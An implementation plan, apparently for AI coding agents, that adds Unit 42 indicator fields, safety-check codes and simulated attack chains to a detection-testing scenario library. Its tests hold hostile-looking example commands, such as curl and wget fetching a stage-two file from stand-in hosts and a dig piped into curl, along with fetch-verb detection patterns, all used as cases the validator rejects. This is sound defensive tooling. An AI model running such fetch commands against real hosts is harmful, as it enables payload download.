# Library Signal Expansion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make "high-quality signal" a counted, gated property of the scenario library, make Unit 42 indicators safely expressible, and add 12 stitched endpoint→network→cloud chains from Unit 42 reports so the count rises from 0 strict / 105 approximate to ≥ 200.

**Architecture:** Track A (Tasks 1–6) adds a scenario-level `indicators[]` block validated by six structural loader codes and mirrored by the edit hook, provenance fields on card IOCs, indicator overrides on the NGFW and cloud-audit emitters, one new WildFire-verdict threat-log emitter, and a `signal_quality` section with floors in the coverage report. Track B (Tasks 7–18) authors one chain per task as a scenario YAML + TTP card pair, touching no shared file. Tasks 19–20 bind the chains into the FY27 crosswalk, set the floors to measured values, regenerate ground truth and docs, and run every gate.

**Tech Stack:** Python 3.11 / Pydantic v2 (loader), SQLAlchemy async (ORM), stdlib argparse scripts (coverage, validate, crosswalk), YAML scenarios, JSON TTP cards, pytest.

**Spec:** `docs/superpowers/specs/2026-10-27-library-signal-expansion-design.md`

## Global Constraints

- Branch `feature/scenarios-unit42-stitched-chains`; stage by name (`git add <path>`), never `-A`/`.`/`-a`; commit trailer `Co-Authored-By: Claude Mythos 5.1 <noreply@anthropic.com>`; no PR.
- `CORTEXSIM_XSIAM_ALLOW_WRITE` / `CORTEXSIM_XSIAM_ALLOW_DESTRUCTIVE` untouched. No new outbound call anywhere: emitter tests stub `httpx.AsyncClient` as the sibling tests do.
- No scenario step may contact adversary infrastructure. A report domain appears in a command only on a DNS-lookup line; a report IP or URL never appears in a command outside an EAL heredoc `params:` block; a report hash never appears on a line with a fetch verb (spec §4.1 S-25/S-26).
- A synthetic log never claims prevention: `ngfw_threat_emitter.action ∈ {alert, allow}` only.
- A `dns_lookup` of a real published domain always names its resolver (`@${LAB_RESOLVER:-…}`) and the chain carries the tag `real-ioc-dns-lookup` (spec §7, provisional ruling flagged to the operator).
- Every synthetic leg carries the run host's identity in-band (`src_ip`/`src_host`/`src_user` or `source_ip`) so `stitching_key` is shared by every leg (spec §5 rule 3a).
- Structural codes S-22..S-27 are NOT gated by `CORTEXSIM_STRICT_REFS` (same as S-17..S-21).
- Core-leg map, verbatim: endpoint = `EDR KOI BROWSER`; network = `NDR`; cloud-identity = `CDR CSPM CLOUD_APP ITDR AI_SPM AI_ACCESS AIRS`; never a leg = `ANALYTICS EMAIL TIM ASM DLP`.
- Indicator vocab: `type ∈ {sha256, sha1, md5, domain, url, ipv4, ipv6, user_agent, ja3, ja4}`, `safe_form ∈ {log_field, dns_lookup, hash_only, wildfire_test_file, eicar}`, `id` matches `^ind-\d{2}$`, values clean (no `[.]`, no `hxxp`).
- Allowed `source_url` hosts: `unit42.paloaltonetworks.com`, `github.com/PaloAltoNetworks/`.
- Numbering: scenarios SIM-MP-023..034, cards TTP-2026-0182..0193, in spec §5 table order. Chain tasks touch only their own two files.
- Every test that pins a rule is observed failing before the rule lands (Gate A).
- Python on the host: `/Users/henry/Github/Github_desktop/cortex-pov-engine/.venv/bin/python`; run pytest from the repo root with `PYTHONPATH=core` as `tests/conftest.py` expects (the suite already does this when invoked as `python -m pytest tests/...`).

## Review Focus

1. A defanged indicator value (`evil[.]com`, `hxxp://`) must be rejected by S-22, not silently stored — a clean value is what enrichment matches on. Test in Task 1.
2. A DNS-lookup line that also pipes into a fetch (`dig +short evil.com | xargs curl`) must still trip S-25 — the allow-list is per line and a line containing `curl`/`wget` is never a lookup line. Test in Task 1.
3. A report domain inside the EAL heredoc but outside `params:` (for example in the campaign `name:` or `target_allowlist:`) must trip S-25 — only the `params:` block is exempt. Test in Task 1.
4. `ngfw_threat_emitter` must refuse `action` case-insensitively (`Block`, `DENY`, `reset-both`, `sinkhole`) with the message `synthetic threat log may not claim a block`. Test in Task 5.
5. A scenario whose `required_planes_in_incident` lists only `ANALYTICS` and `EMAIL` has zero core legs and is not a stitched chain even with a key and indicators; a Windows step whose command is only `Write-Host`/`Write-Output` is marker-only. Tests in Task 6.

---

### Task 1: Scenario `indicators[]` — schema, loader codes S-22..S-27, persistence

**Files:**
- Modify: `core/engine/scenario_loader.py` (add `IndicatorSchema` beside `CgoAnchorSchema` ~line 131; add `indicators` to `ScenarioSchema` beside `cgo_anchor` ~line 515; add a model validator; extend the persisted dict at ~line 1184 where `"cgo_anchor"` is written)
- Modify: `core/models.py` (`Scenario.indicators` JSON column after `composer_layout` ~line 100; `to_dict()` ~line 162)
- Modify: `core/database.py` (`_migrate_scenarios_columns` ~line 214: add `indicators` to the additive column list)
- Test: `tests/engine/test_scenario_loader_indicators.py` (new)

**Interfaces:**
- Consumes: `StepSchema`, `ScenarioSchema`, the S-21 `ValueError("S-21: …")` idiom.
- Produces (later tasks rely on these exact names):
  - `INDICATOR_TYPES: frozenset[str]`, `INDICATOR_SAFE_FORMS: frozenset[str]`, `SOURCE_URL_HOSTS: tuple[str, ...]` in `scenario_loader.py`
  - `class IndicatorSchema(BaseModel)` with fields `id: str`, `type: str`, `value: str`, `source_url: str`, `safe_form: str`, `surfaces_in: list[str]`, `description: Optional[str] = None`
  - `ScenarioSchema.indicators: list[IndicatorSchema] = Field(default_factory=list)`
  - `DNS_LOOKUP_RE`, `FETCH_VERB_RE` module-level compiled regexes
  - `def unsafe_indicator_lines(indicators: list[IndicatorSchema], steps: list[StepSchema]) -> list[str]` — pure; returns one human line per violation, prefixed `S-25:` or `S-26:`; the validator raises `ValueError("\n".join(lines))` when non-empty.
  - Persisted row dict key `"indicators"` (list of dicts, `[]` when absent); `Scenario.to_dict()["indicators"]`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/engine/test_scenario_loader_indicators.py
import pytest
from engine.scenario_loader import (
    IndicatorSchema, ScenarioSchema, StepSchema, INDICATOR_TYPES, INDICATOR_SAFE_FORMS,
    unsafe_indicator_lines,
)

def _ind(**kw):
    base = dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                source_url="https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/",
                surfaces_in=["step-01"])
    base.update(kw); return base

def _step(cmd, sid="step-01"):
    return dict(id=sid, name="n", identity="www-data", mitre_technique="T1071.001", command=cmd,
                expected_detections=[dict(plane="NDR", type="XQL", description="d")])

def test_vocabularies_are_exact():
    assert INDICATOR_TYPES == frozenset({"sha256","sha1","md5","domain","url","ipv4","ipv6","user_agent","ja3","ja4"})
    assert INDICATOR_SAFE_FORMS == frozenset({"log_field","dns_lookup","hash_only","wildfire_test_file","eicar"})

@pytest.mark.parametrize("bad", [
    dict(type="hash"), dict(type="sha256", value="abc"), dict(type="ipv4", value="10.1.2.3", safe_form="log_field"),
    dict(type="domain", value="evil[.]com"), dict(type="url", value="hxxp://evil.com/x", safe_form="log_field"),
    dict(type="domain", value="localhost"), dict(id="indicator-1"),
])
def test_s22_rejects_bad_type_or_malformed_value(bad):
    with pytest.raises(ValueError, match="S-22"):
        IndicatorSchema(**_ind(**bad))

def test_s23_source_url_must_be_unit42_or_panw_github():
    with pytest.raises(ValueError, match="S-23"):
        IndicatorSchema(**_ind(source_url="https://example.com/report"))
    IndicatorSchema(**_ind(source_url="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/x.txt"))

def test_s27_safe_form_must_fit_type():
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="sha256", value="a"*64, safe_form="dns_lookup"))
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="domain", safe_form="hash_only"))
    IndicatorSchema(**_ind(type="sha256", value="a"*64, safe_form="wildfire_test_file"))

def test_s24_surfaces_in_must_name_existing_steps():
    ind = IndicatorSchema(**_ind(surfaces_in=["step-09"]))
    with pytest.raises(ValueError, match="S-24"):
        _scenario(indicators=[ind.model_dump()], steps=[_step("dig +short rn-stage.example")])
    with pytest.raises(ValueError, match="S-24"):
        IndicatorSchema(**_ind(surfaces_in=[]))

@pytest.mark.parametrize("cmd", [
    "curl -s https://rn-stage.example/stage2 -o /tmp/s2",
    "dig +short rn-stage.example | xargs curl -s",
    "cat > /tmp/c.yml <<YML\nname: beacon to rn-stage.example\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: other.example\nYML",
])
def test_s25_domain_outside_dns_lookup_or_params_is_rejected(cmd):
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines(
        [IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]))

@pytest.mark.parametrize("cmd", [
    "dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}",
    "nslookup rn-stage.example", "getent hosts rn-stage.example", "resolvectl query rn-stage.example",
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: rn-stage.example\n      dst_ip: 203.0.113.9\nYML",
])
def test_s25_allows_dns_lookup_lines_and_params_block(cmd):
    assert unsafe_indicator_lines([IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]) == []

def test_s25_ipv4_never_allowed_in_a_command_outside_params():
    ind = IndicatorSchema(**_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"))
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines([ind], [StepSchema(**_step("ping -c1 203.0.113.9"))]))

def test_s26_hash_on_a_fetch_line_is_rejected_but_sha256sum_is_fine():
    h = "b"*64
    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    assert any(l.startswith("S-26") for l in unsafe_indicator_lines([ind], [StepSchema(**_step(f"curl -O https://x/{h}.bin"))]))
    assert unsafe_indicator_lines([ind], [StepSchema(**_step(f"echo '{h}  /tmp/x' | sha256sum -c"))]) == []

def test_scenario_validator_raises_on_unsafe_surfacing():
    with pytest.raises(ValueError, match="S-25"):
        _scenario(indicators=[_ind()], steps=[_step("curl https://rn-stage.example/")])

def test_indicators_persist_and_default_empty():
    from engine.scenario_loader import _schema_to_row  # the row-builder that writes "cgo_anchor" (name per implementer; keep one)
    s = _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example")])
    assert _schema_to_row(s)["indicators"][0]["value"] == "rn-stage.example"
    assert _schema_to_row(_scenario(steps=[_step("id")]))["indicators"] == []
```

`_scenario(**overrides)` is a test helper that builds a minimal valid `ScenarioSchema` from `tests/fixtures/scenarios/` (copy the minimal-dict pattern in `tests/engine/test_scenario_loader_prevention.py`). If the loader's row-builder has another name, import that name and keep the assertion.

- [ ] **Step 2: Run the tests, confirm they fail on import**

Run: `cd <repo> && PYTHONPATH=core .venv/bin/python -m pytest tests/engine/test_scenario_loader_indicators.py -q`
Expected: FAIL / ImportError on `IndicatorSchema`.

- [ ] **Step 3: Implement `IndicatorSchema`, vocabularies, `unsafe_indicator_lines`, the `ScenarioSchema` validator, persistence**

Value rules for S-22: sha256 `^[a-f0-9]{64}$`, sha1 40, md5 32 (case-insensitive); ipv4 dotted quad, each octet ≤255, and not `10.*`, `172.16-31.*`, `192.168.*`, `127.*`, `169.254.*`, `0.*`; domain `^(?=.{1,253}$)([a-z0-9-]+\.)+[a-z]{2,}$` after lowercasing and must not contain `[` or `]`; url must start `http://` or `https://` and contain no `hxxp`; user_agent/ja3/ja4 non-empty. S-25 line rule: split each step `command` on `\n`; inside a heredoc (`<<WORD` … `WORD`) track whether the current line is under a `params:` key at deeper indentation than `params:` itself; a line is a lookup line iff it matches `DNS_LOOKUP_RE = ^\s*(dig|nslookup|host|drill|getent\s+hosts|resolvectl\s+query)\b` AND does not match `FETCH_VERB_RE = \b(curl|wget|pip3?|npm|git\s+clone|Invoke-WebRequest|iwr)\b`. S-26: hash value on a line matching `FETCH_VERB_RE`. Match values case-insensitively for hashes, exactly otherwise.

- [ ] **Step 4: Run the tests, confirm they pass; run the existing loader suites**

Run: `PYTHONPATH=core .venv/bin/python -m pytest tests/engine/test_scenario_loader_indicators.py tests/engine/test_scenario_loader_prevention.py tests/engine/test_corpus_refs_strict.py -q`
Expected: all pass (the 177-count test still passes: no scenario added yet).

- [ ] **Step 5: Add the ORM column, migration entry and `to_dict` key; prove with a test**

Append to the same test file a test that constructs `models.Scenario(indicators=[{"id": "ind-01"}])` and asserts `to_dict()["indicators"]`, and a test that runs `_migrate_scenarios_columns` against an in-memory SQLite `scenarios` table created without the column and asserts the column exists afterwards (follow the existing `composer_layout` migration test if one exists under `tests/`; `grep -rn composer_layout tests` finds it).

- [ ] **Step 6: Commit**

```bash
git add core/engine/scenario_loader.py core/models.py core/database.py tests/engine/test_scenario_loader_indicators.py
git commit -m "feat(scenarios): indicators[] with structural safety codes S-22..S-27"
```

---

### Task 2: Edit hook mirrors S-22..S-27 and warns on marker-only steps

**Files:**
- Modify: `.claude/hooks/lint-scenario.py` (after the causality block in `main()`; keep the hook stdlib + PyYAML only, no `core` import)
- Test: `tests/engine/test_lint_scenario_hook.py` (append)

**Interfaces:**
- Consumes: Task 1's vocabularies for the parity test (`from engine.scenario_loader import INDICATOR_TYPES, INDICATOR_SAFE_FORMS`).
- Produces: hook module constants `INDICATOR_TYPES`, `INDICATOR_SAFE_FORMS`, `SOURCE_URL_HOSTS`, functions `is_marker_only(command: str) -> bool` and `unsafe_indicator_lines(indicators: list[dict], steps: list[dict]) -> list[str]` (same contract as Task 1, dict-shaped input). Marker rule verbatim: split on `\n` and `||`; marker lines match `^\s*(echo|printf|Write-Host|Write-Output|:|true|#)\b|^\s*$`; localhost-curl lines match `curl.*(127\.0\.0\.1|localhost|\$\{?STAGE_HOST)`; a command is marker-only when every line is a marker or localhost-curl line; a command containing `scripts.eal_simulator.cli` or `cortexsim-eal` is never marker-only.

- [ ] **Step 1: Write the failing tests** (append; use the existing `_load_hook()` and the subprocess pattern already in the file)

```python
def test_hook_indicator_vocab_mirrors_loader():
    from engine.scenario_loader import INDICATOR_TYPES, INDICATOR_SAFE_FORMS
    hook = _load_hook()
    assert hook.INDICATOR_TYPES == INDICATOR_TYPES and hook.INDICATOR_SAFE_FORMS == INDICATOR_SAFE_FORMS

@pytest.mark.parametrize("mutate,code", [
    (lambda d: d["indicators"][0].update(type="hash"), "S-22"),
    (lambda d: d["indicators"][0].update(source_url="https://example.com/"), "S-23"),
    (lambda d: d["indicators"][0].update(surfaces_in=["step-99"]), "S-24"),
    (lambda d: d["steps"][0].update(command="curl https://rn-stage.example/"), "S-25"),
    (lambda d: d["indicators"][0].update(type="sha256", value="c"*64, safe_form="hash_only") or d["steps"][0].update(command="wget https://x/" + "c"*64), "S-26"),
    (lambda d: d["indicators"][0].update(type="sha256", value="c"*64), "S-27"),
])
def test_hook_rejects_each_indicator_code(tmp_path, mutate, code):
    d = yaml.safe_load(SAMPLE.read_text())
    d["indicators"] = [dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
        source_url="https://unit42.paloaltonetworks.com/x/", surfaces_in=[d["steps"][0]["id"]])]
    d["steps"][0]["command"] = "dig +short rn-stage.example"
    mutate(d)
    p = tmp_path / "s.yml"; p.write_text(yaml.safe_dump(d, sort_keys=False))
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert r.returncode != 0 and code in r.stdout

def test_hook_marker_only_step_is_a_warning_not_an_error(tmp_path):
    d = yaml.safe_load(SAMPLE.read_text()); d["steps"][0]["command"] = "echo marker || true"
    p = tmp_path / "s.yml"; p.write_text(yaml.safe_dump(d, sort_keys=False))
    r = subprocess.run([sys.executable, str(HOOK), str(p), str(REPO_ROOT)], capture_output=True, text=True)
    assert r.returncode == 0 and "marker-only" in r.stdout and d["steps"][0]["id"] in r.stdout

@pytest.mark.parametrize("cmd,expected", [
    ("echo hi", True), ("printf 'x'\n: nothing", True), ("Write-Host 'x'", True),
    ("echo m; curl -s http://127.0.0.1:8080/ || true", True),
    ("echo m; dig +short rn-stage.example", False),
    ("python3 -m scripts.eal_simulator.cli run /tmp/c.yml --live", False),
])
def test_is_marker_only(cmd, expected):
    assert _load_hook().is_marker_only(cmd) is expected
```

- [ ] **Step 2: Run, confirm failures** — `PYTHONPATH=core .venv/bin/python -m pytest tests/engine/test_lint_scenario_hook.py -q` → new tests FAIL (AttributeError / wrong exit).
- [ ] **Step 3: Implement in the hook** — errors as plain strings prefixed by the code (`"S-25: …"`), warnings as `"WARNING: marker-only step <id>: …"` lines; the hook's existing exit convention (errors → non-zero, warnings → zero) is unchanged.
- [ ] **Step 4: Run the full hook test file and the corpus through the hook** — `for f in scenarios/**/*.yml; do python3 .claude/hooks/lint-scenario.py "$f" . >/dev/null || echo "FAIL $f"; done` must print nothing (the corpus has no indicators yet, so only the marker warning can appear, and it is not an error).
- [ ] **Step 5: Commit** — `git add .claude/hooks/lint-scenario.py tests/engine/test_lint_scenario_hook.py && git commit -m "feat(hooks): lint indicators S-22..S-27 and warn on marker-only steps"`

---

### Task 3: Card IOC provenance — schema fields + `check_ioc_provenance`

**Files:**
- Modify: `detection_scanner/schema/ttp-entry.schema.json` (`properties.detections.properties.iocs.items.properties`: add `source_url` `{type: string, format: uri}`, `published` `{type: string, pattern: "^\\d{4}-\\d{2}(-\\d{2})?$"}`, `safe_form` `{type: string, enum: [log_field, dns_lookup, hash_only, wildfire_test_file, eicar]}`)
- Modify: `detection_scanner/scripts/validate.py` (add `check_ioc_provenance(report, rel, detections, references)` after `check_prevention_modules` ~line 349; call it next to the existing call ~line 533)
- Test: `tests/scripts/test_validate_ioc_provenance.py` (new; call the function directly with a tiny fake `report` object exposing `.err(rel, msg)` / `.warn(rel, msg)` that appends to lists)

**Interfaces:**
- Produces: `check_ioc_provenance(report, rel, detections: dict, references: list) -> None`. Rules: FAIL (`report.err`) when `source_url` is present and its host is not `unit42.paloaltonetworks.com` and the URL does not start with `https://github.com/PaloAltoNetworks/`; WARN when any reference has `publisher_id == "SRC-UNIT42"` and an `iocs[]` entry of `ioc_type ∈ {ipv4, ipv6, domain, url, file-sha256, file-sha1, file-md5}` has no `source_url`; FAIL when `safe_form` is present and not in the enum, or `published` is present and not `YYYY-MM` / `YYYY-MM-DD`.

- [ ] **Step 1: Write the failing tests** — four tests: bad host → one err; Unit 42 card with bare ipv4 → one warn; non-Unit-42 card with bare ipv4 → nothing; valid `source_url` + `published: "2025-04"` + `safe_form: dns_lookup` → nothing. Plus one schema test: load the schema with `jsonschema` (already a validate.py dependency) and assert an `iocs[]` item with `source_url` validates while one with `sauce_url` does not.
- [ ] **Step 2: Run, confirm failures** — `PYTHONPATH=core .venv/bin/python -m pytest tests/scripts/test_validate_ioc_provenance.py -q`.
- [ ] **Step 3: Implement** (schema + function + call).
- [ ] **Step 4: Run the corpus validator** — `.venv/bin/python detection_scanner/scripts/validate.py` → still `356 pass / 0 warn / 0 fail` (no card has `source_url` yet; the WARN rule only fires on Unit 42 cards with *typed* indicators lacking provenance — if the existing corpus produces warnings here, narrow the WARN to cards whose `id` ≥ `TTP-2026-0182` and record the ruling in the ledger; do not relax the FAIL).
- [ ] **Step 5: Commit** — `git add detection_scanner/schema/ttp-entry.schema.json detection_scanner/scripts/validate.py tests/scripts/test_validate_ioc_provenance.py && git commit -m "feat(detection): IOC provenance fields + check_ioc_provenance"`

---

### Task 4: Emitter overrides — NGFW destination, cloud-audit source IP

**Files:**
- Modify: `core/eal_simulator/plugins/ngfw_eal_emitter.py` (`NgfwEalEmitterParams` ~line 265; `build_events` ~line 344)
- Modify: `core/eal_simulator/plugins/cloud_audit_emitter.py` (`CloudAuditEmitterParams` ~line 505; the record builders that take `source_ip` ~lines 131/192)
- Test: `tests/eal_simulator/test_plugin_ngfw_eal_emitter.py`, `tests/eal_simulator/test_plugin_cloud_audit_emitter.py` (append)

**Interfaces:**
- Produces: `NgfwEalEmitterParams.dst_domain: Optional[str] = None`, `.dst_ip: Optional[str] = None` with a model validator `_dst_pair` raising `ValueError("dst_domain and dst_ip must be set together")`; when set, every `_Session` the pattern builds is replaced via `dataclasses.replace(session, dst_domain=…, dst_ip=…)` before `_ngfw_eal_event`. **Also** `src_ip`, `src_host`, `src_user` (each `Optional[str] = None`, independently optional, `src_ip` validated as a dotted quad with RFC1918 allowed): when set they replace the record's `src` (today the constant `_SRC_HOST = "10.0.12.34"`), source hostname and source user fields (added as `src_hostname` / `src_user` if the record has none); unset keeps today's constants byte-for-byte. `CloudAuditEmitterParams.source_ip: Optional[str] = None`, threaded into the AWS and GCP record builders; `None` keeps `_ANOMALOUS_IP`.

- [ ] **Step 1: Write the failing tests** — (a) params with only `dst_domain` raise; (b) `build_events` with both set yields records whose `dst`, `url_domain`, `dst_hostname` equal the overrides for a burst pattern (all `burst_count` records) and a single pattern; (c) `action` stays `"allow"` and the marker is unchanged; (d) cloud audit: `source_ip="203.0.113.77"` appears as `sourceIPAddress` (aws) and `protoPayload.requestMetadata.callerIp` (gcp) on every record; unset keeps the existing constant. Follow the file's `_run`/stub-client helpers.
- [ ] **Step 2: Run, confirm failures.**
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run both emitter test files + `scripts/check-streamer-fidelity.py`** — all green (datasets unchanged).
- [ ] **Step 5: Commit** — `git add core/eal_simulator/plugins/ngfw_eal_emitter.py core/eal_simulator/plugins/cloud_audit_emitter.py tests/eal_simulator/test_plugin_ngfw_eal_emitter.py tests/eal_simulator/test_plugin_cloud_audit_emitter.py && git commit -m "feat(eal): report-indicator overrides on ngfw and cloud-audit emitters"`

---

### Task 5: New `ngfw_threat_emitter` plugin (WildFire verdict log; detection only, never a block)

**Files:**
- Create: `core/eal_simulator/plugins/ngfw_threat_emitter.py` (model on `azure_audit_emitter.py`: `_DATASET = "panw_ngfw_threat_raw"`, a `Params` subclass, an `AnalyticsLogEmitter` subclass with `build_events`)
- Test: `tests/eal_simulator/test_plugin_ngfw_threat_emitter.py` (new; copy the ngfw test's stub-client harness)
- Modify: `docs/reference/eal-plugin-catalog.md` (summary-table row + a short subsection; bump "all N plugins" text), any test that pins the plugin count (`grep -rn "== 26" tests/eal_simulator tests/engine` → bump to 27 with a dated docstring line)

**Interfaces:**
- Produces: plugin `name = "ngfw_threat_emitter"`; `NgfwThreatEmitterParams(AnalyticsEmitterParams)` with `file_sha256: str` (required, `^[a-f0-9]{64}$` case-insensitive), `file_name: str` (required, non-empty), `file_type: str = "PE"`, `verdict: str = "malicious"` (enum `malicious|grayware|benign`), `app: str = "web-browsing"`, `dst_domain: Optional[str]`, `dst_ip: Optional[str]` (pair rule as Task 4), `src_ip` / `src_host` / `src_user` (each independently optional, same semantics as Task 4: override the record's `src`, `src_hostname`, `src_user`; unset keeps constants), `action: str = "alert"` (enum `alert|allow`, compared lowercased; anything else → `ValueError("synthetic threat log may not claim a block")`), `event_pattern: str = "wildfire_malicious_file"` (only value). Record keys: `_dataset`, `subtype: "wildfire"`, `filedigest`, `filename`, `filetype`, `verdict`, `category: "wildfire-virus"`, `threat_name`, `action`, `app`, `proto: "tcp"`, `dst_port: 443`, `src`, `dst`, `dst_domain`, `url_domain`, `severity: "critical"` for malicious else `"medium"`, plus the spine's shared fields and marker `wildfire_verdict_marker`. `analytics_manifest` lists one alert: `"WildFire malicious verdict on downloaded file"`.

- [ ] **Step 1: Write the failing tests** — registration (`ngfw_threat_emitter` in the registry listing the other tests use); `file_sha256` malformed → ValueError; `action` in `["Block","DENY","drop","reset-both","sinkhole"]` → ValueError with the exact message; `alert`/`ALLOW` accepted and lowercased; one record per iteration with `filedigest` lowercased, `verdict`, `dst_domain` override, `_dataset == "panw_ngfw_threat_raw"`; negative control unsupported (same as the ngfw emitter).
- [ ] **Step 2: Run, confirm failures.**
- [ ] **Step 3: Implement the plugin; add the catalog doc row; bump the plugin-count test.**
- [ ] **Step 4: Run** `tests/eal_simulator -q` and `scripts/check-streamer-fidelity.py` → green.
- [ ] **Step 5: Commit** — `git add core/eal_simulator/plugins/ngfw_threat_emitter.py tests/eal_simulator/test_plugin_ngfw_threat_emitter.py docs/reference/eal-plugin-catalog.md <bumped test file> && git commit -m "feat(eal): ngfw_threat_emitter — WildFire verdict log that can never claim a block"`

---

### Task 6: Coverage report `signal_quality` section, floors, ground-truth plumbing

**Files:**
- Modify: `detection_scanner/scripts/coverage_report.py` (`default_config` ~line 99: add `"hq_signal_floor": 0, "stitched_chain_floor": 0, "marker_only_ceiling": 1.0`; new pure helpers; `compute_report` adds the block and breaches; `render_human` prints it; `main()` argparse exposes the three keys)
- Modify: `scripts/generate_ground_truth.py` (carry `coverage["signal_quality"]` into the doc dict ~line 525 and a markdown table in `render_markdown` ~line 548)
- Test: `tests/<existing coverage test dir>/test_coverage_report_signal_quality.py` (new; `grep -rl coverage_report tests` to find the directory and the synthetic-corpus fixture pattern already in use)

**Interfaces:**
- Produces, module-level in `coverage_report.py`: `LEG_MAP: dict[str, str]` (plane → leg, exactly the Global Constraints map); `def scenario_legs(scn: dict) -> set[str]`; `def is_marker_only_step(step: dict) -> bool` (same rule as Task 2); `def is_stitched_chain(scn: dict) -> bool` (≥2 legs, `stitching_key` truthy, `len(required_planes_in_incident) ≥ 2`, `threat_report_url` host `unit42.paloaltonetworks.com`, `len(indicators) ≥ 1`); `def signal_quality(scenarios: list[dict]) -> dict` returning the spec §4.4 keys. Breach strings: `"hq_signals N < floor F"`, `"stitched_chains N < floor F"`, `"marker_only_share S > ceiling C"`.

- [ ] **Step 1: Write the failing tests** — synthetic corpus of three scenarios: (A) stitched chain with 4 step-detections, 1 marker-only step carrying 1 detection → contributes 3 HQS; (B) `required_planes_in_incident: [ANALYTICS, EMAIL]` + key + indicators → 0 legs, not stitched; (C) Windows step `Write-Host 'x'` only → marker-only. Assert `stitched_chains == 1`, `hq_signals == 3`, `marker_only_steps == 2`, shares rounded to 4 places; `--strict` with `hq_signal_floor=4` yields `exit_code == 1` and the breach string; floors at 0 yield 0.
- [ ] **Step 2: Run, confirm failures.**
- [ ] **Step 3: Implement; wire ground truth.**
- [ ] **Step 4: Run** the coverage tests, then `.venv/bin/python detection_scanner/scripts/coverage_report.py --json | python3 -c "import json,sys; print(json.load(sys.stdin)['signal_quality'])"` → prints `stitched_chains: 0, hq_signals: 0, marker_only_steps: 137, steps: 667` (the strict baseline); `python3 scripts/generate_ground_truth.py` regenerates the two files. Do not commit the regenerated ground truth here (Task 20 owns it) — `git checkout -- docs/reference/ground-truth.json docs/reference/ground-truth.md` after confirming it runs.
- [ ] **Step 5: Commit** — `git add detection_scanner/scripts/coverage_report.py scripts/generate_ground_truth.py <test file> && git commit -m "feat(coverage): signal_quality section with hq_signal / stitched_chain floors"`

---

### Chain tasks 7–18 (one per spec §5 row; identical procedure, different brief)

Each chain task creates exactly two files and touches nothing else. The task brief for chain *k* is the spec §5 row *k* plus `scratchpad/lib/chains/<k>.json` (the harvested research record: URL, actor, arc, IOC counts and the IOC source URL) plus `scratchpad/lib/uc-tc-ids.csv` (every valid `tc_id, ucs_id, uc_id, validation_class, title` and `pov_scenario_id`). Reference exemplars to read first: `scenarios/ndr/ndr-012-ngfw-eal-rare-domain-beacon-large.yml` (EAL heredoc step), `scenarios/edr/edr-006-lsass-memory-dump.yml` (agent steps with real commands), `scenarios/multi_plane/mp-017-react2shell-pod-rce-to-cloud-control.yml` (causality spine on a chain), `scenarios/_schema.yml` (every field), `detection_scanner/ttps/TTP-2026-0167-*.json` (streamer card) and `detection_scanner/ttps/TTP-2026-0123-*.json` (chain card).

**Files (chain k):**
- Create: `scenarios/multi_plane/mp-0NN-<slug>.yml`
- Create: `detection_scanner/ttps/TTP-2026-01NN-<slug>.json`

**Interfaces:**
- Consumes: Task 1 `indicators[]`; Task 4/5 emitter params (`dst_domain`/`dst_ip`, `ngfw_threat_emitter` with `file_sha256`); Task 6 `signal_quality` for self-verification.
- Produces: one stitched chain meeting spec §5 rules 1–10.

- [ ] **Step 1: Read the report** (`WebFetch` the `source_url`; the IOC section is in-article unless the record says GitHub) and write the ≤12-line story header. Choose the legs honestly: if the report has no cloud leg, do not invent one.
- [ ] **Step 2: Author the scenario YAML.** ≥6 steps; every non-root step has `causality`; every step has `platforms`; agent steps run the real safe behaviour (process lineage, file paths, persistence, HTTP shape against `${STAGE_HOST:-127.0.0.1}` with the report's URI and user-agent, DNS lookups of report domains with `dig +short <domain> @${LAB_RESOLVER:-127.0.0.53}` — the `@` argument is mandatory, and a chain that does this carries the tag `real-ioc-dns-lookup`); EAL steps use the ndr-012 heredoc shape with the new params **and carry the stitching entity in-band**: the step computes `SRC_IP=$(hostname -I | awk '{print $1}')`, `SRC_HOST=$(hostname -s)`, `SRC_USER=$(id -un)` before the heredoc and passes `src_ip: "$SRC_IP"`, `src_host: "$SRC_HOST"`, `src_user: "$SRC_USER"` (NGFW emitters) or `source_ip: "${EGRESS_IP:-$SRC_IP}"` (cloud audit), so every leg shares the entity `stitching_key` names; `indicators[]` ≥3 with `source_url`, values copied from the live report page (fetch it; if it cannot be fetched, stop and report BLOCKED), ≥1 per synthetic leg where the report publishes one that leg can carry (a network leg may be threat-log-only via `ngfw_threat_emitter` + a report sha256; a leg with no usable indicator keeps the preset destination and the header says it is un-enrichable); `stitching_key`, `required_planes_in_incident`, `correlation_window_seconds`; `tc_refs` chosen from `uc-tc-ids.csv` with `tc_ref`'s `ucs_id == uc_ref`; `pov_scenario_id` from `pov-scenario-ids.csv`; `tags` include `unit42`, `stitched-chain`, `actor:<name>`.
- [ ] **Step 3: Author the card JSON.** Copy the structure of TTP-2026-0123; `id` per the table; `references[0]` = the report with `primary: true`, `publisher_id: "SRC-UNIT42"`; one detection object per `expected_detections[].detection_id` in the family the slug prefix names (`bioc-`, `xql-`, `abioc-`, `CR-MP-00NN`); `iocs[]` mirrors `indicators[]` with `source_url` and `published`; datasets only from `validate.py KNOWN_DATASETS`.
